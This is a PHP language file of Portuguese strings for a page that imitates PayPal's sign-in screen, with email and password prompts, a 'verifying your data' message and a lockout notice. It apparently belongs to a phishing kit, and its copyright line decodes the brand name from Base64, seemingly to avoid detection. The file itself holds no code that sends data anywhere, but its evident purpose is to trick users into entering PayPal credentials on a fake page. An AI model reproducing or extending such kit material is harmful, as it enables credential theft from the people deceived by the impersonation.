<?php
$Z118_01 = "Inicie a sessão na sua conta PayPal";
$Z118_02 = "Endereço de e-mail";
$Z118_03 = "Palavra-passe";
$Z118_04 = "Introduza o seu endereço de e-mail.";
$Z118_05 = "Introduza a sua palavra-passe";
$Z118_06 = "Iniciar sessão";
$Z118_07 = "Esqueceu-se do seu e-mail ou da palavra-passe? ";
$Z118_08 = "Criar conta";
$Z118_09 = "Privacidade";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999 - <script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Todos os direitos reservados.";
$Z118_12 = "A verificar os seus dados…";
$Z118_13 = "Tudo indica que tentou demasiadas vezes. Tente novamente mais tarde.";
?>
